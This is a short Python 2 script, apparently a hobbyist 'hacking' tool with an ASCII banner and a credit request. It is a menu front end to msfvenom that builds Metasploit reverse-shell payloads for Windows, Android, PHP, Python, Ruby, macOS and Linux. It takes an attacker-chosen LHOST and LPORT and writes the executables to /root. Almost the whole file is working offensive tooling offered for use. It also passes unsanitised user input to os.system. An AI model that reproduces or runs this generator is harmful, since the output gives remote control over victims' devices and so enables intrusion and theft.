#!/usr/local/bin/python
# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to show / edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
"""


 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
 ▒ ▒░▒ ▒▒   ▓▒█ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░   ░  ░   ▒   ░        ░  ░    ░    ░ ░  ░ 
 ░  ░  ░      ░   ░      ░  ░      ░  ░   ░    
                  ░                       ░      


"""
import os
import sys
import random
lred = '\033[91m'
lblue = '\033[94m'
lgreen = '\033[92m'
yellow = '\033[93m'
cyan = '\033[1;36m'
purple = '\033[95m'
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
orange = '\033[33m'

colorlist = [red, blue, green, yellow, lblue, purple, cyan, lred, lgreen, orange]
randomcolor = random.choice(colorlist)
banner3list = [red, blue, green, purple]

def payload():
	print """\033[0m033[1m
Payloads Available:\033[0m

{0}1: windows/meterpreter/reverse_tcp

{1}2: android/meterpreter/reverse_tcp

{2}3: php/meterpreter/reverse_tcp

{3}4: python/meterpreter/reverse_tcp

{4}5: ruby/shell_reverse_tcp

{5}6: osx/x86/vforkshell/reverse_tcp

{6}7: linux/aarch64/meterpreter/reverse_tcp

	\033[0m""".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
	choice = raw_input("Payload: ")
	lhost = raw_input("LHOST: ")
	lport = raw_input("LPORT: ")
	name = raw_input("Filename: ")
	if choice == "1":
		payload = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.exe'.format(lhost, lport, name)
		os.system(payload)
	if choice == "2":
		payload = 'msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.apk'.format(lhost, lport, name)
		os.system(payload)
	if choice == "3":
		payload = 'msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.php'.format(lhost, lport, name)
		os.system(payload)
	if choice == "4":
		payload = 'msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.py'.format(lhost, lport, name)
		os.system(payload)
	if choice == "5":
		payload = 'msfvenom -p ruby/shell_reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.rb'.format(lhost, lport, name)
		os.system(payload)
	if choice == "6":
		payload = 'msfvenom -p osx/x86/vforkshell/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.app'.format(lhost, lport, name)
		os.system(payload)
	if choice == "7":
		payload = 'msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.tar'.format(lhost, lport, name)
		os.system(payload)
payload()
